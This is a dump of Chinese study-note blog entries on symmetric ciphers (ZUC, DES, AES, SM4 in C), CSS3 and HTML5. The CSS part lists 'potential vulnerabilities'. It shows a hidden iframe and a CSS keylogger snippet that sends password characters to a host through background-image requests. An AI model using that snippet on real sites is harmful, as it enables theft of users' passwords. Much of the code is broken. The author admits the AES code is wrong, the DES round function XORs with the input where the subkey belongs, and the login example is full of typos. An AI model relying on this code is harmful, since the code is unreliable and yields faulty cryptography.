(LFSR[2]\u0026lt;\u0026lt;16)|(LFSR[0]\u0026gt;\u0026gt;15); } 非线性F函数: $W=(X_0\\oplus R_1)\\boxplus R_2$, $W_1=R_1\\boxplus X_1$, $W_2=R_2\\boxplus X_2$, $R_1=S(L_1(W_{1L}|W_{2H}))$, $R_2=S(L_2(W_{2L}|W_{1H}))$; 其中 $L_1(a)=a\\oplus(a\u0026lt; \u0026lt;_o 2)\\oplus(a\u0026lt; \u0026lt;_o 10)\\oplus(a\u0026lt; \u0026lt;_o 18)\\oplus(a\u0026lt; \u0026lt;_o 24)$, $L_2(a)=a\\oplus(a\u0026lt; \u0026lt;_o 8)\\oplus(a\u0026lt; \u0026lt;_o 14)\\oplus(a\u0026lt; \u0026lt;_o 22)\\oplus(a\u0026lt; \u0026lt;_o 30)$; $S$ 盒为 $(S_0,S_1,S_0,S_1)$, 每8bit作为索引, 返回 $S$ 盒中对应的8bit数值. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 void F(){ uint32 W1 = 0,W2 = 0; W = (X[0]^R1)+R2; W1 = R1+X[1]; W2 = R2+X[2]; R1 = S(L1((W1\u0026lt;\u0026lt;16)|(W2\u0026gt;\u0026gt;16))); R2 = S(L2((W1\u0026gt;\u0026gt;16)|(W2\u0026lt;\u0026lt;16))); } uint32 L1(uint32 x){ return x^rot(x,2)^rot(x,10)^rot(x,18)^rot(x,24); } uint32 L2(uint32 x){ return x^rot(x,8)^rot(x,14)^rot(x,22)^rot(x,30); } uint32 S(uint32 a){ uint8 x[4] = {0}, y[4] = {0}; x[0] = a\u0026gt;\u0026gt;24; x[1] = (a\u0026gt;\u0026gt;16)\u0026amp;0xff; x[2] = (a\u0026gt;\u0026gt;8)\u0026amp;0xff; x[3] = a \u0026amp; 0xff; for (int i = 0; i \u0026lt; 4; ++i) { if (i == 0 || i == 2){ y[i] = S0[x[i]]; } else { y[i] = S1[x[i]]; } } return (y[0]\u0026lt;\u0026lt;24)|(y[1]\u0026lt;\u0026lt;16)|(y[2]\u0026lt;\u0026lt;8)|y[3]; } 密钥流输出: $K=W\\oplus X[3]$, 每个时钟节拍产生32bit密钥流.\n输出参数: OBS 输出比特流(密文或明文).\nZUC生成密钥流分为5个阶段: $ck$ 和 $iv$ 装载到LFSR; 寄存器 $R_1,R_2$ 置空; 初始化模式运行32次; 工作模式运行1次并舍弃输出; 持续工作模式产生密钥流.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // 1. 装载LFSR void keyIVInsert(uint8 *k, uint8 *iv){ for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = (k[i]\u0026lt;\u0026lt;23)|(D[i]\u0026lt;\u0026lt;8)|iv[i]; } } // 2. 置空寄存器 uint32 R1 = 0, R2 = 0; // 3. 初始化模式运行32次 void init(uint8 *k, uint8 *iv){ keyIVInsert(k,iv); R1 = 0; R2 = 0; for (int i = 0; i \u0026lt; 32; ++i) { bitRecons(); F(); LFSRInitMode(W\u0026gt;\u0026gt;1); } } uint32 *keyStreamGenerate(unsigned long keyLen){ uint32 *keyStream = (uint32 *)malloc(keyLen*sizeof(uint32)); // 4. 工作模式运行1次并舍弃输出 bitRecons(); F(); LFSRWorkMode(); // 5. 持续工作模式产生密钥流 for (unsigned long i = 0; i \u0026lt; keyLen; ++i) { bitRecons(); F(); keyStream[i] = W^X[3]; LFSRWorkMode(); } return keyStream; } 安全问题: 能够抵御多种已知针对序列密码的攻击, 主要威胁是侧信道攻击.\n分组密码 本质为单表代换, 复杂多轮非线性, 通过混淆和扩散实现. 组件: S盒(混淆扩散), P置换(扩散), 轮函数F, 密钥扩展.\n结构模型\nS-P网络: 每轮异或密钥后, S盒分组小块混淆扩散, P置换整体扩散, $N_i=F(N_{i-1}\\oplus K_i)$. Feistel网络: 分为左右两部分, $R_i=F(R_{i-1},K_i)\\oplus L_{i-1}$, $L_i=R_{i-1}$, 最后一轮不做对换; 同个算法实现加解密. 工作模式:\nECB(电子密码本): 分组用相同密钥加密; 相同明文产生相同密文; 可并行. CBC(密码分组链接): 初始化 $iv$ 得到第一组密文, 第一组密文与第二组明文异或后再加密; TSL及IPSEc协议推荐; 仅解密支持并行. CFB(密文反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与明文异或后得到密文 $C$, $C$ 高位 $n$ 位填入 $vi$; 流式数据, 错误有界; 仅解密支持并行. OFB(输出反馈): 初始化 $iv$ 得到密文 $E$, $vi$ 左移 $n$ 位, 密文 $E$ 与高位 $n$ 位填入 $vi$, 密文 $E$ 与明文异或后得到密文 $C$; 流式数据, 错误有界; 不支持并行. CTR(计数器): 自增算子加密后与明文异或得到密文; 相当于一次一密; 简单快速安全可并行. DES 数据加密标准(Data Encryption Standard), 体现Shannon密码设计思想, 公开密码算法先例, 16轮Feistel网络对合加解密.\n密钥扩展: 初始密钥(64bit)经PC1表置换得到 $C_i$ 和 $D_i$ (各28bit), 循环左移 $ls_i$ 位, 经PC2表置换得到第 $i$ 轮子密钥 $K_i$ (48bit); 置换表中元素 $pt_{i}$ 意为将待置换中的第 $pt_{i}$ 位置换到第$i$位. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void tablePermute(bit1 *permuted, bit1 *origin, bit8 *table, bit8 size){ bit1 tmp[64] = {0}; for (int i = 0; i \u0026lt; size; ++i) { tmp[i] = origin[table[i]-1]; } bitCopy(permuted,tmp,size); } void keyExp(bit8 *key){ bit1 keyPerRound[64] = {0}; bit1 *keyPrL = \u0026amp;keyPerRound[0]; bit1 *keyPrR = \u0026amp;keyPerRound[28]; byteToBit(keyPerRound,key,8); tablePermute(keyPerRound,keyPerRound,PC1,56); for (int i = 0; i \u0026lt; 16; ++i) { bitRot(keyPrL,28,LS[i]); bitRot(keyPrR,28,LS[i]); tablePermute(subKey[i],keyPerRound,PC2,48); } } 初始置换与结束逆置换: 明(密)文(64bit)经IP表置换进入加密, 完成加(解)密后经IPR表置换得到密(明)文(64bit).\n轮函数: 32bit输入经E表置换扩充到48bit, 与子密钥(48bit)异或后, 经S盒压缩回32bit(混淆), 再经P表置换得到32bit输出(扩散); S盒6位输入 $b_1b_2b_3b_4b_5b_6$, 输出$s_{b_1b_6, b_2b_3b_4b_5}$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 void SPermute(bit1 *permuted, bit1 *origin){ int row, col; bit1 *p1 = origin; bit1 *p2 = permuted; for (int i = 0; i \u0026lt; 8; ++i) { row = 2 * p1[0] + p1[5]; col = 8 * p1[1] + 4 * p1[2] + 2 * p1[3] + p1[4]; byteToBit(permuted,\u0026amp;S[i][row][col],4); p1 += 6; p2 += 4; } } void F(bit1 *output, bit1 *input){ bit1 tmp[48] = {0}; tablePermute(tmp,input,E,48); bitXor(tmp,input,48); SPermute(output,tmp); tablePermute(output,output,P,32); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 加密 tablePermute(textBit,textBit,IP,64); for (int i = 0; i \u0026lt;= 15; ++i) { bitCopy(tmp,textBitR,32); F(textBitR,subKey[i]); bitXor(textBitR,textBitL,32); bitCopy(textBitL,tmp,32); } tablePermute(textBit,textBit,IPR,64); // 解密, 密钥顺序相反 tablePermute(textBit,textBit,IP,64); for (int i = 15; i \u0026gt;= 0; --i) { bitCopy(tmp,textBitL,32); F(textBitL,subKey[i]); bitXor(textBitL,textBitR,32); bitCopy(textBitR,tmp,32); } tablePermute(textBit,textBit,IPR,64); S盒是DES中唯一非线性变换, 设计准则: 改变1bit输入至少2bit发生变化; $S(x)$ 和 $S(x\\oplus 001100)$ 至少2bit发生变化; $S(x)\\neq S(x\\oplus 11ef00)$, $e,f\\in{0,1}$; 改变5bit输入, 输出的0和1数目大致相等; 足够的非线性度以抵抗线性攻击; 差分性均匀以抵抗差分攻击; 足够的代数次数和项目以抵抗插值攻击和高阶差分攻击.\n攻击类型: 穷钥攻击; 侧信道攻击(能量分析, 故障注入分析); 差分攻击; 线性攻击.\n安全问题: 密钥太短(有效仅56bit); 存在弱密钥; 互补对称性(异或运算).\n3-DES: 112(1和3轮密钥相同)/256bit密钥; 加解密速度慢.\nAES (something wrong in the AES code)\n高级数据加密标准(Advanced Encryption Standard), 采用10/12/14轮S-P网络非对合加解密(对应128/192/256bit密钥).\n$GF(2)$ 上多项式域 $GF(2^8)\\cong GF(2)[x]/(x^8+x^4+x^3+x+1)$ 中元素为 $b_{(8)}=b_7x^7+b_6x^6+b_5x^5+b_4x^4+b_3x^3+b_2x^2+b_1x+b_0$, 乘法需对既约多项式 $m(x)=x^8+x^4+x^3+x+1$ 取模, 乘法逆元可由扩展Euclid算法得到. 考虑 $xb_{(8)}=(b_{(8)}\u0026lt; \u0026lt; 1)\\oplus m(x)$, 高次乘法可重复 $x$ 乘实现.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 uint8 modMulti(uint8 x, uint8 y){ uint8 ans = 0, tmp; for (int i = 0; i \u0026lt; 8; ++i) { if (x\u0026amp;0x01){ ans ^= y; } tmp = y\u0026amp;0x80; y \u0026lt;\u0026lt;= 1; if (tmp){ y ^= 0x1B; } x \u0026gt;\u0026gt;= 1; } return ans; } $GF(2^8)$ 上 $degf\\leq 3$ 多项式环 $GF(2^8)/[x^4+1]$ 中元素为 $b_{(32)}=B_3x^3+B_2x^2+B_1x+B_0$, 乘法需对 $x^4+1$ 取模. 考虑 $xb_{(32)}=b_{(32)}\u0026gt; \u0026gt;8$, 高次乘法可视为 $GF(2^8)$ 上矩阵乘法.\n状态矩阵: 128bit明(密)文和密钥按列优先载入4阶方阵, 每列32bit称为\u0026quot;字\u0026quot;, 加(解)密后按列优先输出密(明)文. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void loadState(uint8 state[4][4], uint8* text){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[j][i] = *(text++); } } } void storeState(uint8* text, uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { *(text++) = state[j][i]; } } } 密钥扩展: 4字输入, 扩展为44字输出; $w[i]=w[i-1]\\oplus w[i-4]$, $i\\% 4 \\ne 0$; $w[i]=w[i-4]\\oplus S(w\u0026rsquo;[i-1])\\oplus Rcon[i]$, $i \\% 4 = 0$, 即每个字循环左移1字节后进行S盒置换. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 uint32 mixRoll(uint32 x){ uint32 sub1 = S[(x\u0026gt;\u0026gt;24)\u0026amp;0xff]\u0026lt;\u0026lt;24; uint32 sub2 = S[(x\u0026gt;\u0026gt;16)\u0026amp;0xff]\u0026lt;\u0026lt;16; uint32 sub3 = S[(x\u0026gt;\u0026gt;8)\u0026amp;0xff]\u0026lt;\u0026lt;8; uint32 sub4 = S[x\u0026amp;0xff]; return (sub1\u0026amp;0xff000000)^(sub2\u0026amp;0xff0000)^(sub3\u0026amp;0xff00)^(sub4\u0026amp;0xff); } void keyExp(uint8* key){ int m; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;w[i],key+4*i); } for (int i = 0; i \u0026lt; 10; ++i) { m = 4*i; w[4+m] = w[m]^ mixRol1(w[3+m])^rotConst[i]; w[5+m] = w[1+m]^w[4+m]; w[6+m] = w[2+m]^w[5+m]; w[7+m] = w[3+m]^w[6+m]; } } 轮函数: 主要包括(逆)字节代换, (逆)行位移, (逆)列混合, 轮密钥加(即子密钥异或). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // 加密: 字节代换, 行位移, 列混合, 轮密钥加, 最后一轮跳过列混合 loadState(state, pPlain); addRoundKey(state,pW); for (int j = 0; j \u0026lt; 10; ++j) { pW += 4; subBytes(state); shiftRows(state); mixCols(state); addRoundKey(state,pW); } subBytes(state); shiftRows(state); addRoundKey(state,pW+4); storeState(pCipher,state); // 解密: 密钥顺序相反, 逆行位移, 逆字节代换, 轮密钥加, 逆列混合, 最后一轮跳过逆列混合 loadState(state, pCipher); addRoundKey(state,pW); for (int j = 0; j \u0026lt; 10; ++j) { pW -= 4; shiftRowsInv(state); subBytesInv(state); addRoundKey(state,pW); mixColsInv(state); } shiftRowsInv(state); subBytesInv(state); addRoundKey(state,pW-4); storeState(pPlain,state); 字节代换即取求每个字节在 $GF(2^8)$ 上的逆后进行仿射变换, 可等效为S盒置换; 逆字节代换即逆仿射变换再取逆, 可等效为逆S盒置换.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void subBytes(uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = S[state[i][j]]; } } } void subBytesInv(uint8 state[4][4]){ for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = SInv[state[i][j]]; } } } 行位移即第 $i=0,1,2,3$ 个字循环右移 $i$ 字节; 逆行位移即第 $i$ 个字循环左移 $i$ 字节.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 uint32 rol(uint32 x, uint8 n){ return (x\u0026lt;\u0026lt;n)|(x\u0026gt;\u0026gt;(32-n)); } uint32 ror(uint32 x, uint8 n){ return (x\u0026gt;\u0026gt;n)|(x\u0026lt;\u0026lt;(32-n)); } void shiftRows(uint8 state[4][4]){ uint32 tmp[4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;tmp[i],state[i]); tmp[i] = rol(tmp[i],8*i); store(state[i],\u0026amp;tmp[i]); } } void shiftRowsInv(uint8 state[4][4]){ uint32 tmp[4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { load(\u0026amp;tmp[i],state[i]); tmp[i] = ror(tmp[i],8*i); store(state[i],\u0026amp;tmp[i]); } } 列混合即按列的字在 $GF(2^8)[x^4+1]$ 上与 $a(x)={\\rm 0x03}x^3+{\\rm 0x01}x^2+{\\rm 0x01}x+{\\rm 0x02}$ 相乘; 逆列混合即与 $a^{-1}(x)={\\rm 0x0B}x^3+{\\rm 0x0D}x^2+{\\rm 0x09}x+{\\rm 0x0E}$ 相乘; 均可等效为 $GF(2^8)$ 上的矩阵乘法.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 void mixCols(uint8 state[4][4]){ uint8 tmp[4][4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { tmp[i][j] = state[i][j]; } } for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = modMulti(D[i][0],tmp[0][j]) ^ modMulti(D[i][1],tmp[1][j]) ^ modMulti(D[i][2],tmp[2][j]) ^ modMulti(D[i][3],tmp[3][j]); } } } void mixColsInv(uint8 state[4][4]){ uint8 tmp[4][4] = {0}; for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { tmp[i][j] = state[i][j]; } } for (int i = 0; i \u0026lt; 4; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { state[i][j] = modMulti(DInv[i][0],tmp[0][j]) ^ modMulti(DInv[i][1],tmp[1][j]) ^ modMulti(DInv[i][2],tmp[2][j]) ^ modMulti(DInv[i][3],tmp[3][j]); } } } 安全问题: 主要威胁是侧信道攻击.\nSM4 128bit密钥32轮非平衡Feistel网络. 1字$=$4字节$=$32bit.\n密钥扩展: 初始密钥 $(MK_0,MK_1,MK_2,MK_3)$, $K_i=MK_i\\oplus FK_i$ ,$rk_i = K_{i+4} = K_i\\oplus T(K_{i+1}\\oplus K_{i+2}\\oplus K_{i+3}\\oplus CK_i)$; FK_i 为系统参数, CK_i 为固定参数; 以每个字节前4bit作为行, 后4bit作为列, 进行非线性的S盒置换; 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 13)\\oplus (B \u0026lt; \u0026lt;_o 23)$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 uint32 TKey(uint32 k){ int sk = SPermute(k); return sk^rot(sk,13)^rot(sk,23); } void generateRk(void){ uint32 K[35]; for (int i = 0; i \u0026lt; 4; ++i) { K[i] = MK[i]^FK[i]; } for (int i = 0; i \u0026lt; 32; ++i) { K[(i+4)%4] = K[i%4]^TKey(K[(i+1)%4]^K[(i+2)%4]^K[(i+3)%4]^CK[i]); rk[i] = K[(i+4)%4]; } } 轮函数: $X_{i+4} = X_i\\oplus T\u0026rsquo;(X_{i+1}\\oplus X_{i+2}\\oplus X_{i+3}\\oplus rK_i)$; 进行非线性的S盒置换后, 再对字进行线性变换 $B\\oplus (B \u0026lt; \u0026lt;_o 2)\\oplus (B \u0026lt; \u0026lt;_o 10)\\oplus (B \u0026lt; \u0026lt;_o 18)\\oplus (B \u0026lt; \u0026lt;_o 24)$.\n反序输出: 输入 $(X_1,X_2,X_3,X_4)$, 输出 $(Y_1,Y_2,Y_3,Y_4)=(X_{35},X_{34},X_{33},X_{32})$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 uint32 T(uint32 x){ int sx = SPermute(x); return sx^rot(sx,2)^rot(sx,10)^rot(sx,18)^rot(sx,24); } void F32(void){ for (int i = 0; i \u0026lt; 32; ++i) { X[(i+4)%4] = X[i%4]^T(X[(i+1)%4]^X[(i+2)%4]^X[(i+3)%4]^rk[i]); } for (int i = 0; i \u0026lt; 4; ++i) { Y[i] = X[3-i]; } } 安全问题: 主要威胁是侧信道攻击(故障注入分析).\n","date":"2023-09-04T00:00:00Z","permalink":"https://example.com/p/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/","title":"对称加密"},{"content":"Cascading Style Sheets\n基本结构 1 selector, ... {property:value; ... } 继承: Netscape4不支持 格式化: 块级元素, 行内元素\n多重样式 更详细定义 - 继承 重复定义 - 优先级: 同级别下权重大, 同权重下后定义 !important 1-0-0-0-0 内联 1-0-0-0 1 \u0026lt;tag style=\u0026#34;property:value;...\u0026#34;\u0026gt; id选择器 1-0-0 1 #id {property:value; ... } class选择器 0-1-0 1 .class {property:value; ... } property选择器 0-1-0 1 [property=\u0026#34;value\u0026#34;] {property:value; ... } ~= 包含值(完整) |= 以值开头(完整) ^= 匹配以值开头 $= 匹配以值结尾 *= 匹配值\n伪类(pseudo class) 0-1-0 1 :pseudo_class {property:value; ... } active, checked, disabled, empty, enabled, first-child, first-of-type, focus, hover, in-range, invalid, lang, last-child, last-of-type, link, nth-child(n), nth-last-child(n), nth-last-of-type(n), nth-of-type(n), only-of-type, only-child, option, out-of-range, read-only, read-write, required, root, target, valid, visited\ntag选择器 0-0-1 1 tag {property:value; ... } 伪元素(pseudo element) 0-0-1 1 ::pseudo_element {property:value; ... } after, before, first-letter, first-line, selection\n通配符* 关系符, + \u0026gt; ~ \u0026quot;\u0026quot; | | 否定符:not( ) 0-0-0 分组 tag,tag 共同样式 后代 tag tag 包含元素 父子 tag\u0026gt;tag 仅限子元素 相邻 tag+tag 仅对紧邻元素 外部链接 1 2 3 \u0026lt;head\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;文件名.css\u0026#34;\u0026gt; \u0026lt;\\head\u0026gt; 常用属性 背景: background, -attachment (scroll; fixed; local; initial; inherit), -color, -image, -position, -repeat, -clip, -origin (padding-box; border-box; content-box), -size 字体: @font-face (font-family; src); font, -family, -size, -style (normal; italic; oblique), -variant (normal; small-caps), -weight 文本: color, direction (ltr; rtl), letter-space, line-height, vertical-align, white-space; text-align (left; right; center; justify), -decoration (none; underline; overline; line-through; blink), -indent, -transform (none; capitalize; uppercase; lowercase), -overflow (clip; ellipsis; string), -shadow; word-spacing, -break (normal; break-all; keep-all), -wrap 分页: page-break-after, -before, -inside (auto; always; avoid; left; right) 定位: position (absolute; fixed; relative; static; sticky), bottom, left, right, top, clear (left; right; both; none), clip (shape; auto), cursor (url; default; auto; crosshair; pointer; move; text; wait; help; \u0026hellip;), display (absolute; fixed; relative; static; sticky), float (left; right; none), overflow (visible; hidden; scroll; auto), visibility (visible; hidden; collapse), z-index 网络: grid-column, grid-row Box: box, -shadow, -sizing; overflow, -x/y (no-display; no-content); opacity 外边距: margin, -left/right/top/bottom 轮廓: outline, -color/style/width 边框: border, -left/right/top/bottom, - -color/style/width, -radius 内边距: padding, -left/right/top/bottom 内容: height/width, max/min-height/width 弹性: flex, -grow, -shrink, -basis, -flow, -direction; align, -content, -items (stretch; center; flex-start; flex-end; baseline), -self (space-between; space-evenly; space-around); justify-content, order 列表: list-style, -image, -position (outside; inside), -type (none; disc; circle; squre; decimal; lower-roman; upper-alpha; \u0026hellip;) 多列: columns, conlumn-count, -fill, -gap, -span, -width, -rule, - -color/style/width 表格: border-collapse, -spacing, caption-side, empty-cells, table-layout 生成: content (none; normal; counter; attr; string; open-quote; close-quote; no-open-quote; no-close-quote; url), -increment, -reset; quotes 动画: @keyframes; animation, -name, -duration, -timing-funcion, -delay, -iteration-count, -direction, -play-state 过渡: transition, -property, -duration, -timing-function, -delay 实例: 简单表单 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;登录界面\u0026lt;\\title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;login.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;用户登录\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;loginForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;username\u0026#34; placeholder=\u0026#34;用户名\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;密码\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;登录\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;p id=\u0026#34;message\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;login.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 body { font-family: Arial, sans-serif; } .container { width: 300px; margin: 0 auto; margin-top: 100px; } h1 { text-align: center; } form { margin-top: 30px; } input[type=text] input[type=password] input[type=submit] { display: block; width: 100% padding: 10px margin-bottom: 10xp; } button[type=submit] { background-color: #4CAF50; color: white; } #message { text-align: center; margin-top: 15px; font-weight: bold; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 document.getElementById(\u0026#39;loginForm\u0026#39;).addEventListerner(\u0026#39;submit\u0026#39;, function(e) { e.preventDefault(); var username = document.getElementById(\u0026#39;username\u0026#39;).value; var password = document.getElementById(\u0026#39;password\u0026#39;).value; var data = { username: username, password: password }; fetch(\u0026#39;/login\u0026#39;, { method: \u0026#39;PUT\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify(data) }) .then(function(response) { return responce.text(); }) .then(function(message) { document.getElementById(\u0026#39;message\u0026#39;).textContent = message; }) .catch(function(error) { console.log(error); }) }); 潜在漏洞 iframe transparent 1 \u0026lt;iframe src=\u0026#34;URL\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; keylogger 1 2 3 4 5 \u0026lt;style\u0026gt; input[type=\u0026#34;password\u0026#34;][value$=\u0026#34;a\u0026#34;] { backgroud-image: url(\u0026#34;http//localhost:3000/a\u0026#34;); } \u0026lt;/style\u0026gt; ","date":"2023-08-25T00:00:00Z","permalink":"https://example.com/p/css3/","title":"CSS3"},{"content":"HyperText Markup Language\n基本结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!doctype html\u0026gt; \u0026lt;!-- 声明为html5文件 --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;!-- html内容 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- 头部元素: 标题, 元数据, 脚本, 样式， icon, 关系 --\u0026gt; \u0026lt;title\u0026gt; \u0026lt;!-- html5中标题必需 --\u0026gt; \u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 可见页面内容: 段落, 表单, 链接, 格式, 样式, 程序, 列表, 表格, 框架, 多媒体--\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 元素(element): 1 \u0026lt;begin_tag property=\u0026#34;value\u0026#34;; ...\u0026gt; content \u0026lt;/end_tag\u0026gt; 空元素(empty) 1 \u0026lt;tag property=\u0026#34;value\u0026#34;; ... /\u0026gt; 小写文件名, 完整后缀.html 常用标签 基础: !DOCTYPE, html, head, title, body, h1, \u0026hellip;, h6, p, br, hr, !\u0026ndash;\u0026hellip;\u0026ndash; 格式: abbr, b, cite, code, del, i, q, s, small, sup, sub, template, time, u, var, wbr 表单: form, input, textarea, button, select, optgroup, option, label, fieldset, legend, datalist, output 框架: iframe 图像: img, map, area, canvas, figcaption, figure, svg 音视频: audio, source, video 链接: a, link 列表: ul, ol, li, dt, dd 表格: table, caption, th, tr, td, thead, tbody, tfoot, col, colgroup 语义: style, div, span, header, nav, section, article, aside, footer,details, dialog, summary 元信息: base, meta 程序: script, noscript, embed, object 常用属性 全局: class, contenteditable, data-*, dir, draggable, hidden, id, lang, spellcheck, style, tabindex, title html: manifest del: cite, datetime time: datetime form: accept-charset, action, autocomplete (on; off), enctype (application/x-www-form-urlencoded; multipart/form-data; text/plain), method (get; post), name, target (_blank; _parent; _self; _top) input: accept, alt, autocomplete, autofocus, checked, disabled, formaction, formenctype, formmethod, formtarget, height, maxlength, multiple, name, readonly, required, size, src, type (button; checkbox; color; date; datetime; datetime-local; email; file; hidden; image; month; number; password; radio; range; reset; search; submit; tel; text; time; url; week), value, width textarea: autofocus, cols, disabled, maxlength, name, readonly, required, rows, wrap button: autofocus, disabled, formaction, formenctype, formmethod, formtarget, name, type (button; reset; submit), value select: autofocus, disabled, multiple, name, required, size optgroup: disabled, label option: disabled, label, selected, value lable: for iframe: height, name, src, width img: loading (eager; lazy), alt, height, ismap, src, usemap, width area: alt, coords, href, hreflang, media, rel, shape (default; rect; circle; poly), target, type (MIME) canvas: height, width svg: height, width, xmlns (http://www.w3.org/2000/svg), version (1.1; 1.2; 2.0) audio: autoplay, controls, loop, src source: src, type, srcset video: autoplay, controls, height, loop, muted, poster, src, width a: download, href, hreflang, media, rel (altrenate; author; bookmark; help; license; next; nofollow; noreference; prefetch; prev; search; tag), target, type link: href, hreflang, media, rel, type th: colspan, headers, rowspan, scope (col; colgroup; row; rowgroup) td: colspan, headers, rowspan col: span colgroup: span base: href, target meta: charset, content, http-equiv, name script: async, charset, defer, src, type embed: height, src, type, width object: data, height, name, type, usemap, width 字符集 ASCII, utf-8, ISO-8859-1, URL, 实体符号, ISO-639-1\n","date":"2023-08-20T00:00:00Z","permalink":"https://example.com/p/html5/","title":"HTML5"}]